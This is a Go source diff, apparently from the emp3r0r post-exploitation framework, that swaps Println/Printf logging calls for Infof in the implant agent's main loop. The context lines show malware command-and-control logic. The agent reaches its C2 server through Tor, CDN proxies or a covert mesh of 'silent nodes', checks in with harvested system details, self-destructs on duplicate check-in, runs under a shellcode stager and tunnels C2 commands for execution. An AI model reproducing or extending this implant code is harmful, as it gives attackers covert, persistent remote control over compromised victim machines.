@@ -46,7 +46,7 @@ func agent_main() {
 	is_dll := IsDLL()
 
 	// applyRuntimeConfig
-	logging.Println("Applying runtime config...")
+	logging.Infof("Applying runtime config...")
 	err = common.InitConfig()
 	if err != nil {
 		logging.Fatalf("ApplyRuntimeConfig: %v", err)
@@ -55,7 +55,7 @@ func agent_main() {
 
 	// if run by stager, patch util.TakeASnap to trigger exit(0)
 	if common.RuntimeConfig.IsRunByStager {
-		logging.Println("Agent is run by a stager, patching util.TakeASnap to trigger exit(0)")
+		logging.Infof("Agent is run by a stager, patching util.TakeASnap to trigger exit(0)")
 		origTakeASnap := util.TakeASnap
 		util.TakeASnap = func(forceSleep bool) {
 			if forceSleep {
@@ -82,7 +82,7 @@ func agent_main() {
 		cleanUpDownloadingFiles()
 
 		if is_dll {
-			logging.Printf("%d is invoked by DLL in %d",
+			logging.Infof("%d is invoked by DLL in %d",
 				os.Getpid(), os.Getppid())
 		}
 	}
@@ -90,13 +90,13 @@ func agent_main() {
 	// Construct CC address
 	// if CC is behind tor, a proxy is needed
 	if netutil.IsTor(def.CCAddress) {
-		logging.Printf("CC is on TOR: %s", def.CCAddress)
-		logging.Printf("CC is on TOR (%s), using %s as TOR proxy", def.CCAddress, common.RuntimeConfig.C2TransportProxy)
+		logging.Infof("CC is on TOR: %s", def.CCAddress)
+		logging.Infof("CC is on TOR (%s), using %s as TOR proxy", def.CCAddress, common.RuntimeConfig.C2TransportProxy)
 	} else if common.RuntimeConfig.UseKCP {
 		// run KCP
 		go c2transport.RunKCPClient() // KCP client will run when UseKCP is set
 	}
-	logging.Printf("CCAddress is: %s", def.CCAddress)
+	logging.Infof("CCAddress is: %s", def.CCAddress)
 
 	// DNS
 	if common.RuntimeConfig.DoHServer != "" {
@@ -112,7 +112,7 @@ func agent_main() {
 	// if user wants to use CDN proxy
 	upper_proxy := common.RuntimeConfig.C2TransportProxy // when using CDNproxy: agent => CDN proxy => upper_proxy => C2
 	if common.RuntimeConfig.CDNProxy != "" {
-		logging.Printf("C2 is behind CDN, using CDNProxy %s", common.RuntimeConfig.CDNProxy)
+		logging.Infof("C2 is behind CDN, using CDNProxy %s", common.RuntimeConfig.CDNProxy)
 		cdnproxyAddr := fmt.Sprintf("socks5://127.0.0.1:%d", util.RandInt(1024, 65535))
 		// DoH server
 		dns := "https://9.9.9.9/dns-query"
@@ -125,7 +125,7 @@ func agent_main() {
 				// and AgentProxy will be used for websocket connection, then replaced with 10888
 				err := cdn2proxy.StartProxy(strings.Split(cdnproxyAddr, "socks5://")[1], common.RuntimeConfig.CDNProxy, upper_proxy, dns)
 				if err != nil {
-					logging.Printf("CDN proxy at %s stopped (%v), restarting", cdnproxyAddr, err)
+					logging.Infof("CDN proxy at %s stopped (%v), restarting", cdnproxyAddr, err)
 				}
 			}
 		}()
@@ -143,7 +143,7 @@ func agent_main() {
 		if !common.RuntimeConfig.IsDirectC2Enabled {
 			// Silent Node: never contact C2 directly.
 			// WaitForRoute returns the Gateway IP once a probe KCP dial succeeds.
-			logging.Println("[*] Mesh Silent Node: waiting for a Gateway route...")
+			logging.Infof("[*] Mesh Silent Node: waiting for a Gateway route...")
 			mesh.WaitForRoute() // blocks until first gateway confirmed
 			// Build the C2 HTTP client with TLS config, then override its DialContext
 			// to dial a fresh DialGateway per request using the current best gateway.
@@ -159,7 +159,7 @@ func agent_main() {
 			if def.HTTPClient == nil {
 				logging.Fatalf("Failed to create mesh C2 client")
 			}
-			logging.Printf("[+] Mesh route ready via gateway %s", mesh.GetGatewayIP())
+			logging.Infof("[+] Mesh route ready via gateway %s", mesh.GetGatewayIP())
 
 			// Monitor gateway liveness. When the gateway dies, the
 			// mesh.watchPeers loop closes mesh.GatewayDeadCh. We react by
@@ -191,7 +191,7 @@ func agent_main() {
 			}()
 		} else {
 			// Gateway: also serves the relay, but contacts C2 normally.
-			logging.Println("[*] Mesh Gateway mode: relay started, connecting to C2 directly")
+			logging.Infof("[*] Mesh Gateway mode: relay started, connecting to C2 directly")
 		}
 	}
 
@@ -200,7 +200,7 @@ func agent_main() {
 	// ────────────────────────────────────────────────────────────────────────────
 	if !common.RuntimeConfig.IsP2PEnabled || common.RuntimeConfig.IsDirectC2Enabled {
 		for !isC2Reachable() {
-			logging.Println("[-] C2 unreachable, retrying...")
+			logging.Infof("[-] C2 unreachable, retrying...")
 			util.TakeASnap(false)
 		}
 	}
@@ -213,7 +213,7 @@ connect:
 	isSilentNode := common.RuntimeConfig.IsP2PEnabled && !common.RuntimeConfig.IsDirectC2Enabled
 	if !isSilentNode {
 		if !c2transport.CheckC2Condition(common.RuntimeConfig.C2TransportProxy) {
-			logging.Println("Preflight check failed, signaling parent and sleeping")
+			logging.Infof("Preflight check failed, signaling parent and sleeping")
 			conditionalC2FailNotify()
 			goto connect
 		}
@@ -223,33 +223,33 @@ connect:
 	if !isSilentNode {
 		def.HTTPClient = transport.CreateEmp3r0rHTTPClient(def.CCAddress, common.RuntimeConfig.C2TransportProxy)
 		if def.HTTPClient == nil {
-			logging.Printf("[-] Failed to create HTTP2 client, sleeping, will retry later")
+			logging.Infof("[-] Failed to create HTTP2 client, sleeping, will retry later")
 			util.TakeASnap(false)
 			goto connect
 		}
 	}
 	if common.RuntimeConfig.C2TransportProxy != "" {
-		logging.Printf("Using proxy: %s", common.RuntimeConfig.C2TransportProxy)
+		logging.Infof("Using proxy: %s", common.RuntimeConfig.C2TransportProxy)
 	} else {
-		logging.Println("Not using proxy")
+		logging.Infof("Not using proxy")
 	}
 
 	if !isCheckedIn {
-		logging.Printf("Checking in on %s", def.CCAddress)
+		logging.Infof("Checking in on %s", def.CCAddress)
 		// check in with system info
 		err = c2transport.ReportStatus(common.RuntimeConfig, agentutils.GatherSystemDetails())
 		if err != nil {
 			if strings.Contains(err.Error(), "self-destruct") {
 				logging.Fatalf("Duplicated checkin, self-destructing...")
 			}
-			logging.Printf("CheckIn error: %v, sleeping, will retry later", err)
+			logging.Infof("CheckIn error: %v, sleeping, will retry later", err)
 			util.TakeASnap(false)
 			goto connect
 		}
-		logging.Printf("Checked in on CC: %s", def.CCAddress)
+		logging.Infof("Checked in on CC: %s", def.CCAddress)
 		isCheckedIn = true
 	} else {
-		logging.Printf("Already checked in, skipping registration")
+		logging.Infof("Already checked in, skipping registration")
 	}
 
 	// connect to MsgAPI, the JSON based h2 tunnel
@@ -266,7 +266,7 @@ connect:
 	conn, ctx, cancel, err := c2transport.EstablishC2Connection(msgURL)
 	def.CCMsgConn = conn
 	if err != nil {
-		logging.Printf("Connection failed: %v, signaling parent and sleeping", err)
+		logging.Infof("Connection failed: %v, signaling parent and sleeping", err)
 		if strings.Contains(err.Error(), "403") || strings.Contains(err.Error(), "404") {
 			logging.Warningf("Agent is not recognized by C2 (403/404), requiring re-registration")
 			isCheckedIn = false
@@ -274,12 +274,12 @@ connect:
 		conditionalC2FailNotify()
 		goto connect
 	}
-	logging.Println("Connecting to message tunnel...")
+	logging.Infof("Connecting to message tunnel...")
 	err = c2transport.MsgTunneler(def.CCMsgConn, common.RuntimeConfig, handler.HandleC2Command, ctx, cancel)
 	if err != nil {
 		logging.Errorf("Message tunnel exited with error: %v", err)
 	}
-	logging.Printf("Message tunnel closed, signaling parent and sleeping")
+	logging.Infof("Message tunnel closed, signaling parent and sleeping")
 	// Signal parent (shellcode stager) to suspend us immediately
 	// This prevents attempting reconnection that gets interrupted mid-preflight
 	conditionalC2FailNotify()
@@ -289,10 +289,10 @@ connect:
 }
 
 func setupEnvironment() {
-	logging.Println("setupEnvironment...")
+	logging.Infof("setupEnvironment...")
 	u, err := user.Current()
 	if err != nil {
-		logging.Printf("Get user info: %v", err)
+		logging.Infof("Get user info: %v", err)
 	} else {
 		if os.Getenv("HOME") == "" {
 			os.Setenv("HOME", u.HomeDir)
@@ -310,6 +310,6 @@ func setupEnvironment() {
 }
 
 func cleanUpDownloadingFiles() {
-	logging.Println("cleanUpDownloadingFiles...")
+	logging.Infof("cleanUpDownloadingFiles...")
 	// No more AgentRoot to clean up
 }
